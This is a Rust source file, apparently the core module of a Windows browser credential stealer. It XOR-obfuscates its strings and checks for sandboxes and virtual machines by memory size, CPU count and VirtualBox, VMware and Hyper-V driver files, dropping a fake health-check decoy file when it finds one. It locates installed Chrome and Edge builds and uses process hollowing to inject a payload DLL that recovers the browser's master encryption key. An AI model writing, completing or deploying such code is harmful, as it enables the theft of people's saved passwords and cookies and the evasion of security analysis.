//! Browser injection orchestration: host checks, browser resolution, and hollow injection.

pub mod anti;
mod browsers;
mod hash;
mod hollow;
mod ipc;
mod pe;
mod syscalls;

use std::{
    env,
    ffi::OsStr,
    fs,
    mem,
    os::windows::ffi::OsStrExt,
    path::PathBuf,
    thread,
    time::{Duration, SystemTime, UNIX_EPOCH},
};

use winreg::enums::HKEY_LOCAL_MACHINE;
use winreg::RegKey;
use windows::{
    core::PWSTR,
    Win32::{
        System::{
            Diagnostics::ToolHelp::{
                CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
                TH32CS_SNAPPROCESS,
            },
            Threading::{QueryFullProcessImageNameW, PROCESS_NAME_WIN32, PROCESS_QUERY_INFORMATION},
        },
    },
};

const XOR_KEY: u8 = 0x5A;
const MIN_MEMORY_BYTES: u64 = 4 * 1024 * 1024 * 1024;
const MAX_CPU_CORES: usize = 2;

fn xor_str(data: &[u8]) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
}

fn s_user_data_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x0F, 0x29, 0x3F, 0x28, 0x05, 0x1E, 0x3B, 0x2E, 0x3B, 0x05, 0x08, 0x1F, 0x16,
    ])
}

fn s_data_root_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x1E, 0x3B, 0x2E, 0x3B, 0x05, 0x08, 0x15, 0x15, 0x0E,
    ])
}

fn s_browser_name_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x05, 0x14, 0x3B, 0x37, 0x3F,
    ])
}

fn s_local() -> String {
    xor_str(&[0x36, 0x35, 0x39, 0x3B, 0x36])
}

fn s_roaming() -> String {
    xor_str(&[0x28, 0x35, 0x3B, 0x37, 0x33, 0x34, 0x3D])
}

pub(crate) fn s_ntdll() -> String {
    xor_str(&[0x34, 0x2E, 0x3E, 0x36, 0x36, 0x74, 0x3E, 0x36, 0x36])
}

pub(crate) fn s_nul() -> String {
    xor_str(&[0x14, 0x0F, 0x16])
}

fn s_app_paths_prefix() -> String {
    xor_str(&[
        0x09, 0x15, 0x1C, 0x0E, 0x0D, 0x1B, 0x08, 0x1F, 0x06, 0x17, 0x33, 0x39, 0x28, 0x35, 0x29,
        0x35, 0x3C, 0x2E, 0x06, 0x0D, 0x33, 0x34, 0x3E, 0x35, 0x2D, 0x29, 0x06, 0x19, 0x2F, 0x28,
        0x28, 0x3F, 0x34, 0x2E, 0x0C, 0x3F, 0x28, 0x29, 0x33, 0x35, 0x34, 0x06, 0x1B, 0x2A, 0x2A,
        0x7A, 0x0A, 0x3B, 0x2E, 0x32, 0x29, 0x06,
    ])
}

fn s_program_files() -> String {
    xor_str(&[0x0A, 0x28, 0x35, 0x3D, 0x28, 0x3B, 0x37, 0x1C, 0x33, 0x36, 0x3F, 0x29])
}

fn s_program_files_x86() -> String {
    xor_str(&[
        0x0A, 0x28, 0x35, 0x3D, 0x28, 0x3B, 0x37, 0x1C, 0x33, 0x36, 0x3F, 0x29, 0x62, 0x63, 0x68,
    ])
}

fn s_localappdata() -> String {
    xor_str(&[0x16, 0x15, 0x19, 0x1B, 0x16, 0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B])
}

fn s_decoy_name() -> String {
    xor_str(&[
        0x29, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x05, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x05, 0x39,
        0x32, 0x3F, 0x39, 0x31, 0x74, 0x2E, 0x22, 0x2E,
    ])
}

fn s_decoy_body() -> String {
    xor_str(&[
        0x09, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x7A, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x7A, 0x39,
        0x32, 0x3F, 0x39, 0x31, 0x7A, 0x39, 0x35, 0x37, 0x2A, 0x36, 0x3F, 0x2E, 0x3F, 0x3E, 0x7A,
        0x29, 0x2F, 0x39, 0x39, 0x3F, 0x29, 0x29, 0x3C, 0x2F, 0x36, 0x36, 0x23, 0x74, 0x50,
    ])
}

pub(crate) fn is_restricted_host() -> bool {
    low_physical_memory() || low_cpu_count() || vm_drivers_present()
}

fn low_physical_memory() -> bool {
    use windows::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};

    unsafe {
        let mut status = MEMORYSTATUSEX {
            dwLength: mem::size_of::<MEMORYSTATUSEX>() as u32,
            ..Default::default()
        };
        if GlobalMemoryStatusEx(&mut status).is_err() {
            return false;
        }
        status.ullTotalPhys < MIN_MEMORY_BYTES
    }
}

fn low_cpu_count() -> bool {
    thread::available_parallelism()
        .map(|count| count.get() <= MAX_CPU_CORES)
        .unwrap_or(false)
}

fn vm_drivers_present() -> bool {
    let drivers = env::var("SystemRoot")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("C:\\Windows"))
        .join("System32")
        .join("drivers");
    let names = [
        xor_str(&[0x2C, 0x37, 0x37, 0x35, 0x2F, 0x29, 0x3F, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x32, 0x3D, 0x3C, 0x29, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x39, 0x33, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x1C, 0x18, 0x15, 0x02, 0x1D, 0x09, 0x1F, 0x2E, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x1C, 0x18, 0x15, 0x02, 0x17, 0x15, 0x09, 0x1F, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x38, 0x2F, 0x29, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x32, 0x23, 0x2A, 0x3F, 0x28, 0x38, 0x2F, 0x29, 0x74, 0x29, 0x23, 0x29]),
    ];
    names.iter().any(|name| drivers.join(name).exists())
}

fn run_decoy() {
    let _ = fs::write(env::temp_dir().join(s_decoy_name()), s_decoy_body());
}

pub(crate) fn random_delay_ms() {
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;
    thread::sleep(Duration::from_millis(50 + (seed % 451)));
}

pub(crate) fn wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

fn session_tag() -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{:x}{:x}", std::process::id(), nanos)
}

/// Tracks temporary directories and environment variables for cleanup on drop.
struct Cleanup {
    dirs: Vec<PathBuf>,
}

impl Cleanup {
    fn new() -> Self {
        Self { dirs: Vec::new() }
    }

    fn track_dir(&mut self, path: PathBuf) {
        self.dirs.push(path);
    }
}

impl Drop for Cleanup {
    fn drop(&mut self) {
        for path in &self.dirs {
            let _ = fs::remove_dir_all(path);
        }
        let _ = env::remove_var(s_user_data_env());
        let _ = env::remove_var(s_data_root_env());
        let _ = env::remove_var(s_browser_name_env());
    }
}

/// Returns process IDs whose executable name matches `target_exe`.
fn find_browser_pids(target_exe: &str) -> Vec<u32> {
    let mut pids = Vec::new();
    unsafe {
        let snap = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(s) => s,
            Err(_) => return pids,
        };
        let mut entry = PROCESSENTRY32W {
            dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };
        if Process32FirstW(snap, &mut entry).is_ok() {
            loop {
                let name: String = entry
                    .szExeFile
                    .iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
                    .collect();
                if name.eq_ignore_ascii_case(target_exe) {
                    pids.push(entry.th32ProcessID);
                }
                if Process32NextW(snap, &mut entry).is_err() {
                    break;
                }
            }
        }
        let _ = syscalls::close_handle(snap);
    }
    pids
}

/// Returns the full executable path for `pid`, if accessible.
fn get_process_exe_path(pid: u32) -> Option<String> {
    unsafe {
        let proc = syscalls::open_process(PROCESS_QUERY_INFORMATION.0, pid).ok()?;
        let mut buf = vec![0u16; 1024];
        let mut size = buf.len() as u32;
        QueryFullProcessImageNameW(proc, PROCESS_NAME_WIN32, PWSTR(buf.as_mut_ptr()), &mut size)
            .ok()?;
        syscalls::close_handle(proc).ok()?;
        Some(String::from_utf16_lossy(&buf[..size as usize]))
    }
}

/// Looks up a browser install path from the App Paths registry key.
fn get_browser_exe_from_registry(exe_name: &str) -> Option<PathBuf> {
    let key_path = format!("{}{exe_name}", s_app_paths_prefix());
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    if let Ok(key) = hklm.open_subkey(&key_path) {
        if let Ok(path) = key.get_value::<String, _>("") {
            let p = PathBuf::from(path);
            if p.exists() {
                return Some(p);
            }
        }
    }
    None
}

fn push_path(candidates: &mut Vec<PathBuf>, path: PathBuf) {
    candidates.push(path);
}

/// Resolves a browser executable path from registry and common install locations.
fn find_browser_exe_on_disk(target_exe: &str, browser_name: &str) -> Option<String> {
    let pf = env::var(s_program_files()).unwrap_or_default();
    let pf86 = env::var(s_program_files_x86()).unwrap_or_default();
    let local = env::var(s_localappdata()).unwrap_or_default();

    let mut candidates: Vec<PathBuf> = Vec::new();
    if let Some(p) = get_browser_exe_from_registry(target_exe) {
        candidates.push(p);
    }

    match target_exe {
        "chrome.exe" => match browser_name {
            "Chrome Beta" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Google\\Chrome Beta\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Google\\Chrome Beta\\Application\\chrome.exe"),
                );
            }
            "Chrome Dev" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Google\\Chrome Dev\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Google\\Chrome Dev\\Application\\chrome.exe"),
                );
            }
            "Chrome Canary" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Google\\Chrome SxS\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Google\\Chrome SxS\\Application\\chrome.exe"),
                );
            }
            "Chromium" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Chromium\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Chromium\\Application\\chrome.exe"),
                );
            }
            "CentBrowser" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("CentBrowser\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("CentBrowser\\Application\\chrome.exe"),
                );
            }
            _ => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Google\\Chrome\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf86).join("Google\\Chrome\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Google\\Chrome\\Application\\chrome.exe"),
                );
            }
        },
        "msedge.exe" => match browser_name {
            "Edge Beta" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Microsoft\\Edge Beta\\Application\\msedge.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Microsoft\\Edge Beta\\Application\\msedge.exe"),
                );
            }
            "Edge Dev" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Microsoft\\Edge Dev\\Application\\msedge.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Microsoft\\Edge Dev\\Application\\msedge.exe"),
                );
            }
            _ => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Microsoft\\Edge\\Application\\msedge.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf86).join("Microsoft\\Edge\\Application\\msedge.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Microsoft\\Edge\\Application\\msedge.exe"),
                );
            }
        },
        _ => {}
    }

    for path in candidates {
        if path.exists() {
            return Some(path.to_string_lossy().into_owned());
        }
    }
    None
}

fn resolve_browser_exe(target_exe: &str, browser_name: &str) -> Option<String> {
    find_browser_pids(target_exe)
        .iter()
        .find_map(|&pid| get_process_exe_path(pid))
        .or_else(|| find_browser_exe_on_disk(target_exe, browser_name))
}

/// Injects `payload_dll` into the target browser and returns the recovered master key.
pub fn process_data(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
    anti::apply_stealth();
    if anti::is_host_restricted() {
        run_decoy();
        return None;
    }
    if payload_dll.is_empty() {
        return None;
    }

    let target = browsers::find_target(browser_name)?;
    let browser_exe = resolve_browser_exe(target.exe, browser_name)?;

    let tag = session_tag();
    let profile_dir = env::temp_dir().join(format!("{tag}_p"));

    let mut cleanup = Cleanup::new();
    cleanup.track_dir(profile_dir.clone());

    env::set_var(s_user_data_env(), target.user_data_rel);
    env::set_var(
        s_data_root_env(),
        match target.root {
            browsers::DataRoot::Local => s_local(),
            browsers::DataRoot::Roaming => s_roaming(),
        },
    );
    env::set_var(s_browser_name_env(), browser_name);

    let key = hollow::hollow_inject(&browser_exe, payload_dll, &profile_dir, &tag).ok();
    key
}

pub(crate) fn hex_to_key(hex: &str) -> Option<Vec<u8>> {
    if hex.len() != 64 {
        return None;
    }
    (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect()
}